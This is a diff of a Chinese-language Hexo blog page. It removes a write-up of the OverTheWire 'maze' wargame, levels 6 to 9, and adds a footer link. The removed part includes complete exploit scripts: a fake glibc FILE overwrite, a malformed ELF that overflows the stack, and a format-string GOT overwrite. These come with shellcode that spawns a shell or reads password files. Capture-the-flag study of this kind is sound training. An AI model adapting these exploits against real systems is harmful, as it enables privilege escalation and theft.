-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pre_xor_dword</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">return</span> val ^ <span class="number">0x2A2A2A2A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pre_xor_bytes</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b ^ <span class="number">0x2a</span> <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- addresses (ASLR off, glibc 2.39) ----</span></span><br><span class="line">buf_addr       = <span class="number">0xffffda74</span></span><br><span class="line">exit_got       = <span class="number">0x0804b208</span></span><br><span class="line">libc_base      = <span class="number">0xf7d82000</span></span><br><span class="line">io_file_jumps  = libc_base + <span class="number">0x002287a8</span>   <span class="comment"># 0xf7faa7a8</span></span><br><span class="line">real_lock      = <span class="number">0x0804c238</span>               <span class="comment"># reuse fopen&#x27;s lock</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- build fake FILE (0x98 bytes) ----</span></span><br><span class="line">fake_file_off  = <span class="number">0x30</span>                     <span class="comment"># offset in buf</span></span><br><span class="line">fake_file_addr = buf_addr + fake_file_off</span><br><span class="line"></span><br><span class="line">fake = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(<span class="number">0xfbad2480</span>))    <span class="comment"># 0x00 _flags</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(<span class="number">0</span>)) * <span class="number">3</span>          <span class="comment"># 0x04-0x0C read ptrs</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(exit_got))       <span class="comment"># 0x10 _IO_write_base</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(exit_got))       <span class="comment"># 0x14 _IO_write_ptr</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(exit_got+<span class="number">0x1000</span>))<span class="comment"># 0x18 _IO_write_end</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(exit_got))       <span class="comment"># 0x1C _IO_buf_base</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(exit_got+<span class="number">0x1000</span>))<span class="comment"># 0x20 _IO_buf_end</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>): fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(<span class="number">0</span>)) <span class="comment"># 0x24-0x34</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(<span class="number">2</span>))              <span class="comment"># 0x38 _fileno</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(<span class="number">0</span>)) <span class="comment"># 0x3C-0x44</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(real_lock))      <span class="comment"># 0x48 _lock</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, pre_xor_dword(<span class="number">0</span>))              <span class="comment"># 0x4C _offset (8 bytes)</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(<span class="number">0</span>)) <span class="comment"># 0x54-0x60</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, pre_xor_dword(<span class="number">0</span>))              <span class="comment"># 0x64 __pad5</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(<span class="number">0</span>))              <span class="comment"># 0x6C _mode</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>): fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(<span class="number">0</span>)) <span class="comment"># 0x70-0x93</span></span><br><span class="line">fake += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(io_file_jumps))  <span class="comment"># 0x94 vtable</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(fake) == <span class="number">0x98</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- shellcode: execve(&quot;/bin/sh&quot;) ----</span></span><br><span class="line">sc = (</span><br><span class="line">    <span class="string">b&#x27;\x31\xc0\x50\x68\x2f\x2f\x73\x68&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;\x68\x2f\x62\x69\x6e\x89\xe3\x50&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">)</span><br><span class="line">sc_prexor = pre_xor_bytes(sc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- assemble payload ----</span></span><br><span class="line">payload  = sc_prexor</span><br><span class="line">payload += <span class="built_in">bytes</span>([<span class="number">0x2a</span>] * (fake_file_off - <span class="built_in">len</span>(payload)))  <span class="comment"># pad to fake FILE</span></span><br><span class="line">payload += fake</span><br><span class="line">payload += <span class="built_in">bytes</span>([<span class="number">0x2a</span>] * (<span class="number">0x100</span> - <span class="built_in">len</span>(payload)))           <span class="comment"># pad to fd</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, pre_xor_dword(fake_file_addr))<span class="comment"># overwrite fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- argv[1] = 4 bytes = buf_addr ----</span></span><br><span class="line">argv1 = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, buf_addr)  <span class="comment"># \x74\xda\xff\xff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- execute ----</span></span><br><span class="line">os.chdir(<span class="string">&#x27;/tmp&#x27;</span>)</span><br><span class="line">os.execv(<span class="string">&#x27;/maze/maze6&#x27;</span>, [<span class="string">&#x27;/maze/maze6&#x27;</span>, argv1, payload])</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">maze6@maze:/tmp$ python3 exploit.py</span><br><span class="line">$ cat /etc/maze_pass/maze7</span><br><span class="line">**********</span><br></pre></td></tr></table></figure>
-<h3 id="技术要点">技术要点</h3>
-<p><strong>为什么 fake FILE 不触发 vtable overflow？</strong></p>
-<p>fprintf 输出总长度 ≈ <code>len(argv[1]) + 3 + len(buf) + 1</code> ≈ 4
-+ 3 + 260 + 1 = 268
-bytes。<code>_IO_write_end - _IO_write_base = 0x1000</code>（4KB），远超输出长度。<code>_IO_putc</code>
-宏检测到 <code>_IO_write_ptr &lt; _IO_write_end</code>
-时直接内存写入，<strong>不触发 <code>__overflow()</code> → vtable
-调用</strong>。因此 vtable 仅需通过 <code>_IO_validate_vtable</code>
-的地址范围检查，不需要实际调用。</p>
-<p><strong>为什么 lock 复用真实 FILE 的？</strong></p>
-<p>glibc 的 <code>_IO_lock_lock(fp)</code> 检查
-<code>fp-&gt;_lock != NULL</code> 才会加锁。用真实 FILE 的
-lock（<code>0x0804c238</code>）保证 lock 结构合法且初始为 unlocked
-状态。</p>
-<p><strong>为什么 memfrob 不影响 shellcode？</strong></p>
-<p>所有放入 payload 的字节都经过
-<code>pre_XOR</code>（<code>byte ^ 0x2A</code>）。memfrob 再 XOR
-一次恢复原值。因此 shellcode 和 fake FILE 在 XOR 后回到预期状态。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">B6XkM3Syq6</span></span>
-<h1 id="level-7-level-8">level 7 → level 8</h1>
-<p><code>/maze/maze7</code> 是一个 ELF section header
-dumper。读取攻击者提供的 ELF 文件，信任 header 里的
-<code>e_shoff</code>、<code>e_shnum</code>、<code>e_shentsize</code>、<code>e_shstrndx</code>，循环打印
-section 信息。</p>
-<p>漏洞点在第二次读取 section header：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(fd, &amp;shdr_on_stack, e_shentsize);</span><br><span class="line"><span class="built_in">printf</span>(strtab + shdr.sh_name, shdr.sh_addr, shdr.sh_size);</span><br></pre></td></tr></table></figure>
-<p><code>shdr_on_stack</code> 是固定大小的 <code>Elf32_Shdr</code>，但
-<code>e_shentsize</code> 完全由文件控制。设大以后 <code>read()</code>
-会从 section header 覆盖到 saved return address。</p>
-<p>live 调试测得偏移：section-header stack buffer + 64 → saved eip。</p>
-<p>直接覆盖会先在 <code>free(ptr)</code> / <code>free(strs)</code>
-崩掉，因为栈上的 heap 指针也被污染。稳定做法：</p>
-<ol type="1">
-<li>构造最小 fake ELF</li>
-<li><code>e_shentsize = 220</code>，触发大读</li>
-<li>第一段 section header 保持基本合法，让程序走到
-<code>printf()</code></li>
-<li>覆盖局部变量
-<code>ptr = NULL</code>、<code>strs = NULL</code>，让后续
-<code>free(NULL)</code> 安全返回</li>
-<li><code>sh_name</code> 不用 string table 偏移，放成一个可读 rodata
-绝对地址，满足 <code>printf(ptr + sh_name, ...)</code></li>
-<li>saved eip 跳到栈上 NOP sled，shellcode 执行
-<code>setresuid(15008,15008,15008); execve('/bin/sh')</code></li>
-</ol>
-<p>利用生成脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ehdr</span>(<span class="params">e_shoff, e_shnum, e_shentsize, e_shstrndx</span>):</span><br><span class="line">    e=<span class="built_in">bytearray</span>(<span class="number">52</span>); e[:<span class="number">4</span>]=<span class="string">b&#x27;\x7fELF&#x27;</span>; e[<span class="number">4</span>]=<span class="number">1</span>; e[<span class="number">5</span>]=<span class="number">1</span>; e[<span class="number">6</span>]=<span class="number">1</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>,e,<span class="number">0x20</span>,e_shoff); struct.pack_into(<span class="string">&#x27;&lt;H&#x27;</span>,e,<span class="number">0x2e</span>,e_shentsize); struct.pack_into(<span class="string">&#x27;&lt;H&#x27;</span>,e,<span class="number">0x30</span>,e_shnum); struct.pack_into(<span class="string">&#x27;&lt;H&#x27;</span>,e,<span class="number">0x32</span>,e_shstrndx)</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">ret, buf, path</span>):</span><br><span class="line">    data=<span class="built_in">bytearray</span>(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x800</span>)</span><br><span class="line">    data[:<span class="number">52</span>]=ehdr(<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">220</span>,<span class="number">0</span>)</span><br><span class="line">    data[<span class="number">0x180</span>:<span class="number">0x183</span>]=<span class="string">b&#x27;\x00Z\x00&#x27;</span></span><br><span class="line">    sc=<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;31c0b0a431db66bba03a31c966b9a03a31d266baa03acd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80&#x27;</span>)</span><br><span class="line">    payload=<span class="built_in">bytearray</span>(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">220</span>)</span><br><span class="line">    <span class="comment"># ptr will be overwritten to NULL; sh_name becomes an absolute readable string pointer.</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">0x00</span>, <span class="number">0x0804a008</span>)</span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">0x0c</span>, <span class="number">0x11111111</span>)  <span class="comment"># sh_addr</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">0x10</span>, <span class="number">0x180</span>)       <span class="comment"># sh_offset</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">0x14</span>, <span class="number">3</span>)           <span class="comment"># sh_size</span></span><br><span class="line">    payload[<span class="number">72</span>:<span class="number">74</span>]=<span class="string">b&#x27;A\x00&#x27;</span></span><br><span class="line">    <span class="comment"># Overwritten locals after 40-byte shdr.</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">40</span>, <span class="number">0</span>)             <span class="comment"># ptr local -&gt; NULL; printf uses absolute sh_name</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">44</span>, <span class="number">0</span>)             <span class="comment"># var_10h scratch</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">48</span>, <span class="number">0</span>)             <span class="comment"># strs local -&gt; NULL; free(NULL) safe</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">52</span>, <span class="number">0</span>)             <span class="comment"># shdr counter</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">56</span>, <span class="number">0x42424242</span>)    <span class="comment"># saved ebx</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">60</span>, <span class="number">0x43434343</span>)    <span class="comment"># saved ebp</span></span><br><span class="line">    struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, payload, <span class="number">64</span>, ret)           <span class="comment"># saved eip</span></span><br><span class="line">    payload[<span class="number">80</span>:<span class="number">160</span>]=<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">80</span></span><br><span class="line">    payload[<span class="number">160</span>:<span class="number">160</span>+<span class="built_in">len</span>(sc)]=sc</span><br><span class="line">    data[<span class="number">0x100</span>:<span class="number">0x100</span>+<span class="built_in">len</span>(payload)]=payload</span><br><span class="line">    Path(path).write_bytes(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    ret=<span class="built_in">int</span>(sys.argv[<span class="number">1</span>],<span class="number">16</span>) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span> <span class="keyword">else</span> <span class="number">0xffffdb70</span></span><br><span class="line">    buf=<span class="built_in">int</span>(sys.argv[<span class="number">2</span>],<span class="number">16</span>) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">2</span> <span class="keyword">else</span> <span class="number">0xffffdb14</span></span><br><span class="line">    build(ret, buf, <span class="string">&#x27;maze7_exploit.elf&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ret), <span class="built_in">hex</span>(buf))</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maze7@maze:/tmp$ /maze/maze7 maze7_exploit.elf</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=15008(maze8) gid=15007(maze7) <span class="built_in">groups</span>=15007(maze7)</span><br><span class="line">$ <span class="built_in">cat</span> /etc/maze_pass/maze8</span><br><span class="line">**********</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">eQdZB1qy6L</span></span>
-<h1 id="level-8-level-9">level 8 → level 9</h1>
-<p><code>/maze/maze8</code> 是 TCP format string
-service。接受端口参数监听本地，错误口令路径：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">recv(client_fd, input, <span class="number">511</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">snprintf</span>(reply, <span class="number">512</span>, input);</span><br><span class="line">send(client_fd, reply, <span class="built_in">strlen</span>(reply), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
-<p>探测 format offset：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA.%1$08x -&gt; AAAA.41414141</span><br></pre></td></tr></table></figure>
-<p>payload 开头的 dword 就是第一个 positional
-argument。<code>strlen()</code> 在 <code>snprintf()</code>
-后立刻调用，可覆盖 <code>strlen@got</code>：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strlen@got = 0x0804b268</span><br></pre></td></tr></table></figure>
-<p>payload 结构：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload  = p32(strlen_got)</span><br><span class="line">payload += p32(strlen_got + <span class="number">2</span>)</span><br><span class="line">payload += <span class="string">b&quot;%&lt;low-8&gt;x%1$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&lt;high-low&gt;x%2$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;\x90&quot;</span> * pad</span><br><span class="line">payload += shellcode</span><br></pre></td></tr></table></figure>
-<p>最初尝试把 <code>strlen@got</code> 指向 <code>/bin/sh</code>
-shellcode。GDB 下能看到成功执行 <code>/usr/bin/dash</code>，但远程
-socket 没有交互输出：<code>/bin/sh</code> 的 stdin/stdout 不等于 client
-socket。</p>
-<p>最终解法是不 spawn shell，而是让 shellcode 直接完成取证：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setresuid(15009,15009,15009)</span><br><span class="line">open(&#x27;/etc/maze_pass/maze9&#x27;, O_RDONLY)</span><br><span class="line">read(fd, esp, 64)</span><br><span class="line">write(4, esp, n)          ; accepted client fd</span><br><span class="line">exit(0)</span><br></pre></td></tr></table></figure>
-<p>最终脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">31338</span></span><br><span class="line">STRLEN_GOT = <span class="number">0x0804b268</span></span><br><span class="line">TARGET = <span class="number">0xffffda50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setresuid(15009,15009,15009); open(&#x27;/etc/maze_pass/maze9&#x27;); read(fd, esp, 64); write(4, esp, n); exit(0)</span></span><br><span class="line">SC = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&#x27;31c0b0a431db66bba13a89d989dacd80&#x27;</span></span><br><span class="line">    <span class="string">&#x27;31c05068617a65396873732f6d68655f7061682f6d617a682f65746389e331c931d2b005cd80&#x27;</span></span><br><span class="line">    <span class="string">&#x27;89c389e1b240b003cd80&#x27;</span></span><br><span class="line">    <span class="string">&#x27;89c231dbb304b004cd80&#x27;</span></span><br><span class="line">    <span class="string">&#x27;31dbb001cd80&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_for</span>(<span class="params">target</span>):</span><br><span class="line">    low = target &amp; <span class="number">0xffff</span></span><br><span class="line">    high = (target &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    writes = [(STRLEN_GOT, low, <span class="number">1</span>), (STRLEN_GOT + <span class="number">2</span>, high, <span class="number">2</span>)]</span><br><span class="line">    writes.sort(key=<span class="keyword">lambda</span> item: item[<span class="number">1</span>])</span><br><span class="line">    prefix = struct.pack(<span class="string">&#x27;&lt;II&#x27;</span>, writes[<span class="number">0</span>][<span class="number">0</span>], writes[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">    count = <span class="built_in">len</span>(prefix)</span><br><span class="line">    pad1 = (writes[<span class="number">0</span>][<span class="number">1</span>] - count) % <span class="number">0x10000</span></span><br><span class="line">    pad2 = (writes[<span class="number">1</span>][<span class="number">1</span>] - writes[<span class="number">0</span>][<span class="number">1</span>]) % <span class="number">0x10000</span></span><br><span class="line">    fmt = prefix + <span class="string">f&#x27;%<span class="subst">&#123;pad1&#125;</span>x%1$hn%<span class="subst">&#123;pad2&#125;</span>x%2$hn&#x27;</span>.encode()</span><br><span class="line">    <span class="keyword">return</span> fmt + <span class="string">b&#x27;\x90&#x27;</span> * (<span class="number">200</span> - <span class="built_in">len</span>(fmt)) + SC + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proc = subprocess.Popen([<span class="string">&#x27;/maze/maze8&#x27;</span>, <span class="built_in">str</span>(PORT)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)</span><br><span class="line">time.sleep(<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock = socket.create_connection((<span class="string">&#x27;127.0.0.1&#x27;</span>, PORT), timeout=<span class="number">2</span>)</span><br><span class="line">    sock.recv(<span class="number">200</span>)</span><br><span class="line">    sock.sendall(payload_for(TARGET))</span><br><span class="line">    end = time.time() + <span class="number">4</span></span><br><span class="line">    out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> time.time() &lt; end:</span><br><span class="line">        readable, _, _ = select.select([sock], [], [], <span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> readable:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        chunk = sock.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        out += chunk</span><br><span class="line">    sys.stdout.buffer.write(out)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    proc.terminate()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proc.wait(timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        proc.kill()</span><br></pre></td></tr></table></figure>
-<p>live 输出：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">maze8@maze:/tmp$ python3 solve_maze8_readpass.py</span><br><span class="line">**********</span><br></pre></td></tr></table></figure>
-<p>完成证明：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 2225 maze9@maze.labs.overthewire.org</span><br><span class="line">maze9@maze:~$ <span class="built_in">id</span></span><br><span class="line">uid=15009(maze9) gid=15009(maze9) <span class="built_in">groups</span>=15009(maze9)</span><br><span class="line">maze9@maze:~$ <span class="built_in">ls</span> -l /maze /etc/maze_pass/maze9</span><br><span class="line">-r-------- 1 maze9 maze9 11 Apr  3 15:19 /etc/maze_pass/maze9</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">TtMMzTuXyi</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/35/">35</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/4/"><i class="fa fa-angle-right"></i></a>
   </nav>
@@ -1835,7 +1666,10 @@ socket。</p>
     </span>
 </div>
   <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9taXN0Lw==">NexT.Mist</span>
-  </div>
+  </div><div class="beian">
+    <a href="https://icp.gov.moe/?keyword=20264433" target="_blank">萌ICP备20264433号</a>
+</div>
+
 
     </div>
   </footer>
